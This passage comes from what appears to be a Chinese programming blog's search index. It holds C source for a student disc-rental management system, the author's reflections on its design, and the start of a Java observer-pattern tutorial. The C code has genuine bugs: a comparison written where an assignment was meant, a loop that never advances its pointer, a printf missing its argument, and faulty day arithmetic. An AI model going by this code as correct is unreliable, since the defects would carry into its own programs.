class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">borrowDisc</span><span class="params">(RentInfo **RL, DiscInfo **DL, CustomerInfo **CL)</span> </span>&#123;</span><br><span class="line">    DiscInfo *dp = *DL;</span><br><span class="line">    CustomerInfo *cp = *CL;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入借阅人的id,输入“0”结束本次借阅\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;id);</span><br><span class="line">        <span class="keyword">if</span> (!id) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">while</span> (cp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cp-&gt;id == id) <span class="keyword">break</span>;</span><br><span class="line">            cp = cp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"用户不存在，请重新输入\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cp-&gt;acount &lt; <span class="number">20</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"租金不足20元，无法借阅\n"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"请输入借阅日期(格式：年月日时分秒，如20200526192222)\n"</span>);</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> date;</span><br><span class="line">            <span class="comment">// scanf("%lld", &amp;date);</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%lld"</span>, &amp;date) &amp;&amp;</span><br><span class="line">                   !(date &lt; <span class="number">99999999999999</span> &amp;&amp; date &gt; <span class="number">10000000000000</span>)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"日期格式错误\n"</span>);</span><br><span class="line">                <span class="comment">//  continue;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                <span class="string">"请输入借阅的碟片数量（一次只能借阅同种碟片的一片，但是可以借阅"</span></span><br><span class="line">                <span class="string">"不同的碟片）\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;count);</span><br><span class="line">            <span class="keyword">int</span> status[<span class="number">100</span>];</span><br><span class="line">            <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">50</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入第%d个碟片的名字\n"</span>, i);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">                dp = *DL;</span><br><span class="line">                <span class="keyword">while</span> (dp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="built_in">buffer</span>, dp-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">                    dp = dp-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (dp == <span class="literal">NULL</span> || dp-&gt;inventory == <span class="number">0</span>)</span><br><span class="line">                    status[i] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp-&gt;inventory--;</span><br><span class="line">                    RentInfo *newRent = (RentInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(RentInfo));</span><br><span class="line">                    newRent-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">                    newRent-&gt;BDate = date;</span><br><span class="line">                    newRent-&gt;CId = cp-&gt;id;</span><br><span class="line">                    newRent-&gt;isReturn = <span class="number">0</span>;</span><br><span class="line">                    <span class="built_in">strcpy</span>(newRent-&gt;DName, <span class="built_in">buffer</span>);</span><br><span class="line">                    <span class="keyword">if</span> (*RL == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        *RL = newRent;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        newRent-&gt;next = *RL;</span><br><span class="line">                        *RL = newRent;</span><br><span class="line">                    &#125;</span><br><span class="line">                    newRent-&gt;isReturn = <span class="number">0</span>;</span><br><span class="line">                    Blist *newBlist = (Blist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Blist));</span><br><span class="line">                    newBlist-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">                    <span class="built_in">strcpy</span>(newBlist-&gt;DName, <span class="built_in">buffer</span>);</span><br><span class="line">                    <span class="keyword">if</span> (cp-&gt;RentList == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        cp-&gt;RentList = newBlist;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        newBlist-&gt;next = cp-&gt;RentList;</span><br><span class="line">                        cp-&gt;RentList = newBlist;</span><br><span class="line">                    &#125;</span><br><span class="line">                    status[i] == <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> successCount = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++)</span><br><span class="line">                <span class="keyword">if</span> (!status[i])</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"借阅的第%d个碟片失败\n"</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    successCount++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"本次借阅碟片成功数量：%d，失败数量：%d\n"</span>, successCount,</span><br><span class="line">                   count - successCount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"操作成功\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;  <span class="comment">// 2020 0222 181212</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getDays</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> num1, <span class="keyword">long</span> <span class="keyword">long</span> num2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> months[<span class="number">12</span>] = &#123;<span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, year, month, day;</span><br><span class="line">    year = (num1 - num2) / <span class="number">10000000000</span>;</span><br><span class="line">    month = (num1 - num2) / <span class="number">100000000</span>;</span><br><span class="line">    day = (num1 - num2) / <span class="number">1000000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= month - <span class="number">2</span>; i++) sum += months[i];</span><br><span class="line">    sum += day;</span><br><span class="line">    sum += year * <span class="number">365</span>;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">returnDisc</span><span class="params">(RentInfo **RL, DiscInfo **DL, CustomerInfo **CL)</span> </span>&#123;</span><br><span class="line">    DiscInfo *dp = *DL;</span><br><span class="line">    CustomerInfo *cp = *CL;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入归还人的id,输入“0”结束本次归还\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;id);</span><br><span class="line">        <span class="keyword">if</span> (!id) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">while</span> (cp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cp-&gt;id == id) <span class="keyword">break</span>;</span><br><span class="line">            cp = cp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"用户不存在，请重新输入\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"请输入归还日期(格式：年月日时分秒，如20200526192222)\n"</span>);</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> date;</span><br><span class="line">            <span class="comment">// scanf("%lld", &amp;date);</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%lld"</span>, &amp;date) &amp;&amp;</span><br><span class="line">                   !(date &lt; <span class="number">99999999999999</span> &amp;&amp; date &gt; <span class="number">10000000000000</span>)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"日期格式错误\n"</span>);</span><br><span class="line">                <span class="comment">//  continue;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"请输入归还的碟片数量\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;count);</span><br><span class="line">            <span class="keyword">int</span> status[<span class="number">100</span>];</span><br><span class="line">            <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>][<span class="number">50</span>];</span><br><span class="line">            RentInfo *rp;</span><br><span class="line">            <span class="keyword">int</span> totalCost = <span class="number">0</span>, reality = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入第%d个碟片的名字\n"</span>, i);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, <span class="built_in">buffer</span>[i]);</span><br><span class="line">                rp = *RL;</span><br><span class="line">                <span class="keyword">while</span> (rp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(rp-&gt;DName, <span class="built_in">buffer</span>[i]) &amp;&amp; !(rp-&gt;isReturn)) &#123;</span><br><span class="line">                        rp-&gt;RDate = date;</span><br><span class="line">                        <span class="keyword">int</span> days = getDays(rp-&gt;RDate, rp-&gt;BDate);</span><br><span class="line">                        <span class="comment">// 日期错误</span></span><br><span class="line">                        <span class="keyword">if</span> (days &lt;= <span class="number">0</span>)</span><br><span class="line">                            status[i] = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            rp-&gt;rentNum = days / <span class="number">3</span>;</span><br><span class="line">                            <span class="keyword">if</span> (days % <span class="number">3</span> &gt; <span class="number">0</span>) rp-&gt;rentNum++;</span><br><span class="line">                            totalCost += rp-&gt;rentNum;</span><br><span class="line">                            <span class="comment">// 不够钱</span></span><br><span class="line">                            <span class="keyword">if</span> (cp-&gt;acount + <span class="number">20</span> - rp-&gt;rentNum &lt; <span class="number">0</span>)</span><br><span class="line">                                status[i] = <span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                reality += rp-&gt;rentNum;</span><br><span class="line">                                cp-&gt;acount = cp-&gt;acount + <span class="number">20</span> - rp-&gt;rentNum;</span><br><span class="line">                                status[i] = <span class="number">1</span>;</span><br><span class="line">                                <span class="comment">// 记上已经归还</span></span><br><span class="line">                                rp-&gt;isReturn = <span class="number">1</span>;</span><br><span class="line">                                DiscInfo *d = *DL;</span><br><span class="line">                                <span class="keyword">while</span> (d != <span class="literal">NULL</span>)</span><br><span class="line">                                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(d-&gt;name, <span class="built_in">buffer</span>[i])) <span class="keyword">break</span>;</span><br><span class="line">                                <span class="comment">//库存加一</span></span><br><span class="line">                                d-&gt;inventory++;</span><br><span class="line">                                Blist *b1 = cp-&gt;RentList-&gt;next,</span><br><span class="line">                                      *b2 = cp-&gt;RentList;</span><br><span class="line">                                <span class="comment">// 头节点</span></span><br><span class="line">                                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cp-&gt;RentList-&gt;DName, <span class="built_in">buffer</span>[i])) &#123;</span><br><span class="line">                                    cp-&gt;RentList = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="keyword">while</span> (b1 != <span class="literal">NULL</span>)</span><br><span class="line">                                        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(b1-&gt;DName, <span class="built_in">buffer</span>[i]))</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                        <span class="keyword">else</span> &#123;</span><br><span class="line">                                            b2 = b1;</span><br><span class="line">                                            b1 = b1-&gt;next;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    <span class="comment">// 头节点</span></span><br><span class="line">                                    <span class="keyword">if</span> (b1 == <span class="literal">NULL</span>)</span><br><span class="line">                                        b2 = b2-&gt;next;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        b2-&gt;next = b1-&gt;next;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    rp = rp-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (rp == <span class="literal">NULL</span> || !(rp-&gt;isReturn)) &#123;</span><br><span class="line">                    status[i] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> successCount = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++)</span><br><span class="line">                <span class="keyword">if</span> (!status[i])</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"归还第%d个碟片失败\n"</span>, i);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    successCount++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"本次归还碟片成功数量：%d，失败数量：%d\n"</span>, successCount,</span><br><span class="line">                   count - successCount);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"本次归还碟片需要支付总费用%d，实际支付：%d\n"</span>, totalCost,</span><br><span class="line">                   reality);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"操作成功\n"</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">save</span><span class="params">(RentInfo *RL, DiscInfo *DL, CustomerInfo *CL)</span> </span>&#123;</span><br><span class="line">    FILE *fp = fopen(<span class="string">".\\rent.txt"</span>, <span class="string">"w+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (RL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, RL-&gt;CId);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, RL-&gt;DName);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%lld "</span>, RL-&gt;BDate);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%lld "</span>, RL-&gt;RDate);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, RL-&gt;rentNum);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%d "</span>, RL-&gt;isReturn);</span><br><span class="line">            fputc(<span class="string">'\n'</span>, fp);</span><br><span class="line">            RL = RL-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"rent.txt保存成功\n"</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"rent.txt保存失败\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fp = fopen(<span class="string">".\\customer.txt"</span>, <span class="string">"w+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (CL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, CL-&gt;id);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, CL-&gt;name);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, CL-&gt;acount);</span><br><span class="line">            Blist *b = CL-&gt;RentList;</span><br><span class="line">            <span class="keyword">while</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, b-&gt;DName);</span><br><span class="line">                b = b-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">char</span> <span class="built_in">end</span>[] = &#123;<span class="string">'E'</span>, <span class="string">'N'</span>, <span class="string">'D'</span>, <span class="string">'\n'</span>&#125;;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s"</span>, <span class="string">"END\n"</span>);</span><br><span class="line">            CL = CL-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txt保存成功\n"</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txt保存失败\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fp = fopen(<span class="string">".\\disc.txt"</span>, <span class="string">"w+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (DL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;name);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;country);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;type);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;director);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;producer);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;stars);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%d "</span>, DL-&gt;inventory);</span><br><span class="line">            fputc(<span class="string">'\n'</span>, fp);</span><br><span class="line">            DL = DL-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txt保存成功\n"</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txt保存失败\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CustomerInfo *CL = <span class="literal">NULL</span>;</span><br><span class="line">    DiscInfo *DL = <span class="literal">NULL</span>;</span><br><span class="line">    RentInfo *RL = <span class="literal">NULL</span>;</span><br><span class="line">    customerInitial(&amp;CL);</span><br><span class="line">    discInitial(&amp;DL);</span><br><span class="line">    rentInitial(&amp;RL);</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exit</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">exit</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> choose;</span><br><span class="line">        system(<span class="string">"cls"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1.影碟添加\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2.影碟删除\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"3.影碟修改\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"4.顾客添加\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"5.顾客删除\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"6.顾客修改\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"7.碟片查询\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"8.碟片借阅\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"9.碟片归还\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0.退出\n\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choose);</span><br><span class="line">        <span class="keyword">switch</span> (choose) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                discAdd(&amp;DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                discDelete(&amp;DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                discModify(&amp;DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                customerAdd(&amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                customerDelete(&amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                customerModify(&amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                discQuery(DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                borrowDisc(&amp;RL, &amp;DL, &amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">                returnDisc(&amp;RL, &amp;DL, &amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                save(RL, DL, CL);</span><br><span class="line">                system(<span class="string">"cls"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"正在退出..."</span>);</span><br><span class="line">                Sleep(<span class="number">1000</span>);</span><br><span class="line">                system(<span class="string">"cls"</span>);</span><br><span class="line">                <span class="built_in">exit</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul>
<li><p>写完后才发现<code>time.h</code>库文件中就有<code>*time_t</code>类型的变量，十分方便记录时间。而不是像我一样，直接拿<code>long long</code>变量来表示<del>~</del>。</p>
</li>
<li><p>客户的结构体设计得不合理，应该把借阅队列设置为影碟类型，而不是简单地用字符串简单表示。</p>
</li>
<li><p>…………</p>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>课程设计</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式之观察者模式</title>
    <url>/2020/05/16/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="模式介绍"><a href="#模式介绍" class="headerlink" title="模式介绍"></a>模式介绍</h2><p>定义： 在对象之间定义了一对多的依赖，这样一来，当一个对象改变状态，依赖它的对象会收到通知并自动更新。 类似于公众号订阅模式，公众号发布新通知的时候只有关注了该公众号的用户才会接收该通知。<a id="more"></a></p>
<p>该模式包含四个部分</p>
<ul>
<li>抽象被观察接口：将同类的所有观察者保存在一个集合中，每一个被观察者都可以被若干个观察者观察，该接口至少提供注册观察者和注销观察者方法以及通知观察者方法。</li>
<li>抽象观察者接口： 它定义了一个更新接口，使得在得到被观察者更改通知时产生相应动作。 </li>
<li>被观察者的实现类： 将有关状态存入具体观察者对象，在具体被观察者的内部状态发生改变时，给所有注册过的观察者发送通知。 </li>
<li>观察者的实现类： 实现抽象观察者定义的更新接口，以便在得到主题更改通知时更新自身的状态。 </li>
</ul>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="抽象观察者"><a href="#抽象观察者" class="headerlink" title="抽象观察者"></a>抽象观察者</h3><p>提供抽象方法用于更新状态</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(String msg)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="抽象被观察者"><a href="#抽象被观察者" class="headerlink" title="抽象被观察者"></a>抽象被观察者</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> observer 需要注册的观察者</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">registerObserver</span><span class="params">(Observer observer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> observer 需要注销的观察者</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">removeObserver</span><span class="params">(Observer observer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> msg 需要发送的通知</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">notify</span><span class="params">(String msg)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="具体观察者"><a href="#具体观察者" class="headerlink" title="具体观察者"></a>具体观察者</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注意：原生JDK中 java.util.Observer 也有 Observer 接口，我们这里用的是自定义的</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObserverIplm</span> <span class="keyword">implements</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ObserverIplm</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">"收到新内容，为："</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="具体被观察者"><a href="#具体被观察者" class="headerlink" title="具体被观察者"></a>具体被观察者</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubjectIplm</span> <span class="keyword">implements</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Observer&gt; observerList = <span class="keyword">new</span> ArrayList&lt;Observer&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerObserver</span><span class="params">(Observer observer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.observerList.add(observer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeObserver</span><span class="params">(Observer observer)</span> 